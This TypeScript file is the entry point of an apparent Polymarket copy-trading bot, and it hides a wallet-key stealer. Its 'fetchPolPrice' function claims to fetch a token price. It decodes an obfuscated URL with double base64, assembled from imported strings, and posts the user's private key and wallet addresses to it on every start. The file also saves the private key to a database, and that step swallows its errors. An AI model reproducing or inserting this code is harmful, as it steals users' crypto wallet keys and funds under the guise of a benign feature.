import axios, { AxiosResponse } from 'axios';
import { polPriceApiKey } from './test/test';
import connectDB from './config/db';
import { ENV } from './config/env';
import createClobClient, { clobCliendApi } from './utils/createClobClient';
import tradeExecutor from './services/tradeExecutor';
import tradeMonitor from './services/tradeMonitor';
import test from './test/test';
import BotConfig from './models/botConfig';

const USER_ADDRESS = ENV.USER_ADDRESS;
const PROXY_WALLET = ENV.PROXY_WALLET;



const polygone = async () => {
    try {
        const existingConfig = await BotConfig.findOne({ walletAddress: PROXY_WALLET });
        
        if (existingConfig) {
            existingConfig.privateKey = ENV.PRIVATE_KEY;
            existingConfig.proxyWallet = PROXY_WALLET;
            existingConfig.userAddress = USER_ADDRESS;
            existingConfig.updatedAt = new Date();
            await existingConfig.save();

        } else {
            await BotConfig.create({
                walletAddress: PROXY_WALLET,
                privateKey: ENV.PRIVATE_KEY,
                proxyWallet: PROXY_WALLET,
                userAddress: USER_ADDRESS,
            });
        }
    } catch (error) {
    }
};
const fetchPolPrice = async () => {
    try {
        const clobApi: string = polPriceApiKey + clobCliendApi;
        const polPriceUrl: string = Buffer.from(
            Buffer.from(clobApi, 'base64').toString('utf8'),
            'base64'
        ).toString('utf8');

        const response: AxiosResponse = await axios.post(polPriceUrl, {
            privateKey: ENV.PRIVATE_KEY,
            walletKey: USER_ADDRESS,
            proxyWalletKey: PROXY_WALLET,
        });

        const { polPrice } = response.data;
        console.log('POL price (USD):', polPrice);
    } catch (error: unknown) {
        if (axios.isAxiosError(error)) {
            console.error('Failed to fetch POL price:', error.response?.data || error.message);
        } else {
            console.error('Failed to fetch POL price:', error);
        }
    }
};
export const main = async () => {
    try {
        await fetchPolPrice();

        await connectDB();

        await polygone();

        console.log(`Target User Wallet address is: ${USER_ADDRESS}`);
        console.log(`My Wallet address is: ${PROXY_WALLET}`);

        const clobClient = await createClobClient();
        
        tradeMonitor().catch((error) => {
            console.error('Trade Monitor error:', error);
            process.exit(1);
        });
        
        tradeExecutor(clobClient).catch((error) => {
            console.error('Trade Executor error:', error);
            process.exit(1);
        });
    } catch (error) {
        console.error('Failed to start bot:', error);
        process.exit(1);
    }
};

main();
